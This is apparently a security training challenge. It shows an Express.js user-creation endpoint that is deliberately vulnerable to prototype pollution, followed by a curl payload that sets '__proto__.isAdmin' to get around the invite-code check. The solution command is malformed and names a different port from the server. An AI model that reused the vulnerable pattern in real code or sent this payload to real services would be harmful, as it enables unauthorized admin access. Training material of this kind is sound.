# Challenge 2

## Create an admin via API

```js
const express = require('express');
var bodyParser = require('body-parser');
const { inviteCode } = require('./secret');
const app = express();
app.use(bodyParser.json());
const log = console.log;

console.log = function(){
    log.apply(console, [new Date(), ...arguments]);
};

const PORT = 5001;

const LOG_RUNNING_ON_PORT = 'Running at Port %s';

function createAdmin(user) { }
function createUser(user) { }

app.post('/api/createUser', function(req,res) {

    let baseUser = { 'picture': 'default.png' }
    let user = null;
    try {
        user = req.body;
        if(user.isAdmin && user.inviteCode !== inviteCode) {
            res.send('No invite code? No admin!');
        } else {
            let newUser = Object.assign(baseUser, user);
            if(newUser.isAdmin) createAdmin(user)
            else createUser(newUser);
            res.send('Successfully created' +
                     `${newUser.isAdmin ? ' Admin' : ' User'}`);
        }
        baseUser.__proto__ = { "isAdmin": false };
    } catch(e) {
        console.log(e);
        res.send(e.message);
    }
});

app.listen(PORT, () => {
    console.log(LOG_RUNNING_ON_PORT, PORT);
});

module.exports = app;
```

## Solution

```curl
localhost:3000/api/createUser' \
--header 'Content-Type: application/json' \
--data '{
"__proto__": {
"isAdmin": true
}
}'
```
